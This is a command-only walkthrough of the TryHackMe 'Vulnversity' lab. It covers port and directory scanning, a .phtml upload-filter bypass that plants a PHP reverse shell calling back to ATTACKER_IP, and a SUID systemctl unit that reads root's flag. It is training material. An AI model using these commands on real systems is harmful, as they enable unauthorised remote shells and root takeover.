---
link: https://tryhackme.com/room/vulnversity
difficulty: Easy
description: Command-only reference. Linux host, full-port recon, .phtml upload-filter bypass to a www-data shell, SUID systemctl to root.
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_try_hack_me_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Vulnversity Writeup</p></div>

  <img src="https://cdn-images.tryhackme.com/room-icons/85dee7ce633f5668b104d329da2769c3.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://tryhackme.com/p/nedmoeca">nedmoeca</a></p>
    <p style="margin: 0;">Author(s): <a href="https://tryhackme.com/p/1337rce">1337rce</a></p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Prerequisites

`nmap`, `gobuster`, Burp Suite, `netcat` (nc), pentestmonkey `php-reverse-shell`, `openvpn`, plus `sed`/`grep`/`cp`. `find` and `systemctl` are used on the target through the caught shell.

## Placeholder legend

| Token         | Where to get it                                                                    |
| ------------- | --------------------------------------------------------------------------------- |
| `TARGET_IP`   | The target machine IP shown on the room page after deploy. Changes per spawn.      |
| `ATTACKER_IP` | Your THM VPN address (`ip addr show tun0`). Reassigned on every VPN reconnect.     |

Flags (`user.txt`, `root.txt`) are omitted deliberately; read them yourself with the commands shown.

## Terminal / host map

No pivoting; single target. Mind where each command runs:

- **Attack box:** `nmap`, `gobuster`, Burp, `nc -lvnp`, `cp`/`sed`/`grep` on the local shell copy, browser uploads.
- **Target (inside the caught `www-data` shell):** `ls /home`, `cat .../user.txt`, `find ... -perm -4000`, the `systemctl` payload, `cat /tmp/rootflag.txt`.

---

## Task 2 Reconnaissance

Full port sweep (run on the attack box):

```
nmap -p- --min-rate 5000 -Pn TARGET_IP
```

Version/script scan the ports found open:

```
nmap -A -p 21,22,139,445,3128,3333 TARGET_IP
```

Web app is on the non-standard port **3333**:

```
http://TARGET_IP:3333
```

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 3 Locating directories using Gobuster

```
gobuster dir -u http://TARGET_IP:3333 -w /usr/share/wordlists/dirb/common.txt -t 40
```

Upload form lives at:

```
http://TARGET_IP:3333/internal/
```

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 4 Compromise the Webserver

### Find the allowed extension (Burp Intruder)

1. Proxy > Intercept **on**, upload `test.php` through the form at `http://TARGET_IP:3333/internal/` to capture the request.
2. Confirm it is `POST /internal/index.php`, `multipart/form-data`, with `filename="test.php"`.
3. Right-click > **Send to Intruder**, intercept **off**.
4. Positions tab: **Clear §**, highlight only the extension, **Add §** so it reads `filename="test.§php§"`. Attack type **Sniper**.
5. Payloads > Simple list:

```
php
php3
php4
php5
phtml
```

6. **Start attack**, compare the **Length** column. The outlier (`phtml`) is the accepted extension; Apache still executes `.phtml` as PHP.

### Get a reverse shell

Copy the pentestmonkey shell and rename to the allowed extension in one move:

```
cp /usr/share/webshells/php/php-reverse-shell.php ./php-reverse-shell.phtml
```

Point it at your VPN IP (`$port` stays `1234`):

```
sed -i 's/127.0.0.1/ATTACKER_IP/' php-reverse-shell.phtml
grep -E '\$ip|\$port' php-reverse-shell.phtml
```

Start the listener and leave it running (must be up before you trigger the shell):

```
nc -lvnp 1234
```

Upload `php-reverse-shell.phtml` through the form, then trigger it by browsing to it; the tab will hang, that's expected:

```
http://TARGET_IP:3333/internal/uploads/php-reverse-shell.phtml
```

### User flag (in the caught shell, on the target)

```
ls /home
cat /home/bill/user.txt
```

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 5 Privilege Escalation

Find SUID binaries (on the target); `/bin/systemctl` is the outlier:

```
find / -perm -4000 -type f 2>/dev/null
```

```
ls -l /bin/systemctl
```

Weaponize SUID `systemctl`: write a oneshot unit and start it as root. Keep the multi-line `echo` intact:

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/rootflag.txt; chmod 666 /tmp/rootflag.txt"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cat /tmp/rootflag.txt
```

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

## Fill-in: per-spawn values

| Token         | Value (fill in) |
| ------------- | --------------- |
| `TARGET_IP`   |                 |
| `ATTACKER_IP` |                 |
